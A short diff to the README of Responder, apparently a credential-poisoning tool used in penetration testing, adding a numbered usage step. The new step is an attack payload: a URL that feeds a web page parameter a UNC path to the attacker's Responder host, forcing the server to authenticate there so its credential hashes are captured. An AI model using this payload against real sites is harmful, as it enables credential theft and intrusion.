@@ -113,7 +113,8 @@ Edit this file /etc/NetworkManager/NetworkManager.conf and comment the line: `dn
 
 ## Usage ##
 
-First of all, please take a look at Responder.conf and tweak it for your needs.
+1. First of all, please take a look at Responder.conf and tweak it for your needs.
+2. Open web browser with http://[web_site]/index.php?page=//[Responder_IP]/somefile
 
 Running the tool:
 
